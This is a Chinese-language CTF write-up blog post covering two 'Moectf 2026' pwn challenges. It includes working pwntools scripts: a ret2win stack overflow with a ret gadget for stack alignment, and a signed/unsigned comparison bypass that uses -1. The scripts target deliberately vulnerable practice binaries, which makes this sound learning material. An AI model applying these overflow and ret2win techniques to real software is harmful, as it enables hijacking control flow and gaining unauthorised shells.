+++
date = '2026-09-20T12:34:45+08:00'
draft = false
title = 'Moectf 2026'
tags = ["pwn"]
categories = ["CTF"]
+++


## 一、走后门

### 1.解体步骤

首先将题目丢到IDA中，发现后门函数backdoor的内存地址为`0x401209`，这是我们劫持rip后要返回的地址，可以直接拿到shell

![函数](/images/moectf-2026/图片1.png)

#### ①试错

由下图可知缓冲区为64个字节，再加上旧rbp，也就是main函数的返回地址的8个字节，所以我们只要填充72个垃圾字节，再加上backdoor函数地址，就构造出payload
![vuln](/images/moectf-2026/图片2.png)

```python
from pwn import *

io = remote('127.0.0.1',44133)

io.sendline(b'100')

io.send(b'a'*72 + p64(0x401209))

io.interactive()
```

但是，运行后崩溃了。猜测是由于栈不对齐导致的，于是去验证一下，重新编写payload：

#### ②寻找ret

我试了两种方法，一种是先进入pwndbg，执行`rop`指令，然后寻找ret
![ret](/images/moectf-2026/图片4.png)
找到`ret`地址为`0x40101a`

还可以执行`ROPgadget --binary '/home/run/pwn' --only "pop|ret" | grep "rdi"`来看，更清晰（但我用这种方法时有的时候不管用）

#### ③最终版

```python
from pwn import *

io = remote('127.0.0.1',44133)

io.sendline(b'100')

io.send(b'a'*72 + p64(0x40101a)+ p64(0x401209))

io.interactive()
```

成功了

### 2.flag

![flag](/images/moectf-2026/图片3.png)



## 二、灯神的愿望

### 1.解题步骤

扔进IDA，注意到，执行win函数即可拿到shell
![ret](/images/moectf-2026/图片5.png)

分析main函数
![ret](/images/moectf-2026/图片6.png)

对于第一个问题，显然必须输入1，否则直接break
此时，`n2`被赋值为`1`
接着进入第二问，它将我们的输入的值先赋给`n0x1BF51_1`，且必须小于0，否则`break`。然后，程序又把值赋给了`n0x1BF51`，蹦出来一句话，没什么用。然后继续给出那三个选项，不过，我们输入的第二个值要求比0x1BF51更大，换到十进制为114513，而我们第二个值还必须是不大于0的，所以自然想到无符号数，一个`-1`搞定，然后输入`3``许愿

### payload

```python
from pwn import *

io = remote('127.0.0.1',34749)

io.sendline(b'1')

io.sendline(b'-1')

io.sendline(b'3')

io.interactive()
```

### flag

![ret](/images/moectf-2026/图片7.png)
![ret](/images/moectf-2026/图片8.png)